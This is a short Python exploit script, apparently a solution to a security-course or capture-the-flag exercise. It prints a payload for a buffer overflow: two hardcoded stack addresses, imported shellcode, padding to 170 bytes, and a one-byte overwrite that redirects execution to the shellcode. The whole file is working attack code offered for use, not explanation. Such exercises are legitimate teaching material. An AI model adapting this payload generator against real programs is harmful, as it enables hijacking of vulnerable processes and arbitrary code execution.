import sys
from shellcode import shellcode

# First crafted address (points to memory holding the second crafted address)
addr_1 = b"\x1e\x0f\xf7\xbf"

# Second crafted address (points to the start of the shellcode)
addr_2 = b"\x22\x0f\xf7\xbf"

buf_lsb = b"\x1a" 

print(len(shellcode))

sys.stdout.buffer.write(addr_1)
sys.stdout.buffer.write(addr_2)

sys.stdout.buffer.write(shellcode)
sys.stdout.buffer.write(b"a" * (170 - len(shellcode) - 8))
sys.stdout.buffer.write(buf_lsb)

